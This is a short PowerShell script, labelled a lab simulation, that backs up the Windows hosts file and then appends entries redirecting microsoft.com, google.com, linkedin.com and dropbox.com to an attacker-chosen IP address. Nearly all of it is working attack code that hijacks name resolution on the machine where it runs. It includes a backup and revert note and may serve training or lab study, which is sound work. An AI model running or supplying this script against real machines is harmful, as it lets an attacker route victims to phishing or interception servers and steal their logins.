<#
.SYNOPSIS
    DNS Spoofing via hosts file manipulation (lab simulation)
.DESCRIPTION
    Redirects specific domain names to attacker-controlled IPs.
#>

Write-Host "`n🧬 DNS Spoof Simulation Tool (Hosts File Hijack)" -ForegroundColor DarkCyan

# Input attacker IP
$attackerIP = Read-Host "Enter IP address to redirect domains to"

# Spoof list
$spoofList = @("microsoft.com", "google.com", "linkedin.com", "dropbox.com")

# Hosts file path
$hostsFile = "C:\Windows\System32\drivers\etc\hosts"

# Backup original hosts
$backupFile = "$hostsFile.bak"
if (!(Test-Path $backupFile)) {
    Copy-Item -Path $hostsFile -Destination $backupFile -Force
    Write-Host "✅ Hosts file backed up."
}

foreach ($domain in $spoofList) {
    "$attackerIP `t$domain" | Add-Content -Path $hostsFile
    Write-Host "🔁 Spoofed $domain -> $attackerIP"
}

Write-Host "`n🧠 DNS spoofing simulation complete. Flush DNS cache for effect."
Write-Host "🧼 To revert: restore from $backupFile"
